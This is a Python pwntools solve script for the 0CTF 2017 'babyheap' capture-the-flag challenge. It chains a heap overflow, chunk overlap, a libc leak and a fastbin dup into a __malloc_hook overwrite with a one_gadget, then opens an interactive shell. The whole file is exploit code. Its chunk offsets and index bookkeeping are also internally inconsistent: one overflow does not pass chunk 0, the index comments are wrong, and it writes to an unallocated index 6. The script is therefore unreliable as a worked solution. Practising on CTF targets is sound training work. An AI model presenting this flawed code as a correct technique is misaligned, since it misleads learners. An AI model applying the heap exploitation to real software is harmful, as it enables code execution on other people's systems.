#!/usr/bin/env python3
"""0CTF 2017 - babyheap solve script
Vulnerability: Heap overflow in Fill function
Technique: Chunk overlap -> libc leak -> fastbin dup -> malloc_hook overwrite
"""
from pwn import *

context.arch = 'amd64'
elf = context.binary = ELF("./binary", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

def start():
    return process([elf.path], env={"LD_PRELOAD": libc.path})

def alloc(size):
    io.sendlineafter('Command: ', '1')
    io.sendlineafter('Size: ', str(size))

def fill(index, content):
    io.sendlineafter('Command: ', '2')
    io.sendlineafter('Index: ', str(index))
    io.sendlineafter('Size: ', str(len(content)))
    io.sendafter('Content: ', content)

def free(index):
    io.sendlineafter('Command: ', '3')
    io.sendlineafter('Index: ', str(index))

def dump(index):
    io.sendlineafter('Command: ', '4')
    io.sendlineafter('Index: ', str(index))
    io.recvuntil('Content: \n')
    return io.recvline()

io = start()

# Initial allocations
alloc(0xf0)  # 0
alloc(0x70)  # 1
alloc(0xf0)  # 2
alloc(0x30)  # 3

fill(0, b'0'*0xf0)
fill(1, b'1'*0x70)
fill(2, b'2'*0xf0)
fill(3, b'3'*0x30)

# Overflow chunk 0 to shrink chunk 1's size
fill(0, flat(b'4'*0x70, p64(0x180), p64(0x100)))

free(1)
alloc(0xf0)  # 1 - overlap chunk 2
fill(1, b'5'*0xf0)

free(2)

# Leak libc
alloc(0x128)  # 1
data = dump(0)
leak = u64(data[:8])
malloc_hook = leak - 0x68
libc.address = malloc_hook - libc.sym['__malloc_hook']
log.info(f"libc base: {hex(libc.address)}")

# Fastbin attack
alloc(0x60)  # 2
alloc(0x60)  # 4
alloc(0x60)  # 5
free(4)

fake_chunk = libc.sym['__malloc_hook'] - 0x23
fill(0, flat(b'B'*0x80, p64(0x90), p64(0x70), fake_chunk))

free(5)
free(0)

alloc(0x60)  # 0
alloc(0x60)  # 5
fill(0, flat(p64(fake_chunk), p64(0), b'y'*0x50))

alloc(0x60)  # 0
one_gadget = libc.address + 0x4526a
fill(6, b'z'*0x13 + p64(one_gadget))

# Trigger malloc hook
io.sendline('1')
io.sendline('1')
io.interactive()
